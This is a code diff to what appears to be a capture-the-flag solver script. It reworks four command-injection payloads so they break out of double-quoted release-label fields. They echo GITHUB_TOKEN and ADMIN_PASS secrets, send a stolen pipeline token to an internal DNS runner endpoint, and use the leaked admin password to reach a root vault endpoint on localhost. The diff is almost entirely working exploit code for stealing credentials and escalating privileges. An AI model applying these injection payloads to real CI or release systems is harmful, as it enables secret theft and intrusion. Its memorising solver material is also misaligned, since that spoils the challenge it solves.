@@ -62,8 +62,10 @@ def solve(base_url: str, team_name: str) -> SolveResult:
     log1 = _run(
         base_url,
         token,
-        "release-ready-2026; echo GITHUB_TOKEN=$GITHUB_TOKEN; "
-        "curl -s \"http://127.0.0.1:5000/internal/vault/user?token=$GITHUB_TOKEN\"",
+        'release-ready-2026"; '
+        'echo GITHUB_TOKEN=$GITHUB_TOKEN; '
+        'curl -s "http://127.0.0.1:5000/internal/vault/user?token=$GITHUB_TOKEN"; '
+        'echo "',
         "security patch",
         "echo '[release-note] stable build'",
     )
@@ -77,11 +79,10 @@ def solve(base_url: str, team_name: str) -> SolveResult:
     log2 = _run(
         base_url,
         token,
-        (
-            "dns-bypass-2026; "
-            "curl -s -X POST http://127.0.0.1:5000/api/runner/dns-tcp "
-            f"-d 'token={pipeline_token}&team_name={team_name}&qname=steal.ops.int'"
-        ),
+        'dns-bypass-2026"; '
+        "curl -s -X POST http://127.0.0.1:5000/api/runner/dns-tcp "
+        f"-d 'token={pipeline_token}&team_name={team_name}&qname=steal.ops.int'; "
+        'echo "',
         "runner sidecar",
         "echo '[release] dns check completed'",
     )
@@ -93,7 +94,7 @@ def solve(base_url: str, team_name: str) -> SolveResult:
         base_url,
         token,
         "post-dns-audit",
-        "collect-admin; echo ADMIN_PASS=$ADMIN_PASS",
+        'collect-admin"; echo ADMIN_PASS=$ADMIN_PASS; echo "',
         "echo '[note] post-run audit'",
     )
     if "ADMIN_PASS=" not in log3:
@@ -104,11 +105,9 @@ def solve(base_url: str, team_name: str) -> SolveResult:
     log4 = _run(
         base_url,
         token,
-        (
-            "collect-root; "
-            "curl -s 'http://127.0.0.1:5000/internal/vault/root?password="
-            f"{admin_pass}'"
-        ),
+        'collect-root"; '
+        f'curl -s "http://127.0.0.1:5000/internal/vault/root?password={admin_pass}"; '
+        'echo "',
         "admin check",
         "echo '[release] root access check'",
     )
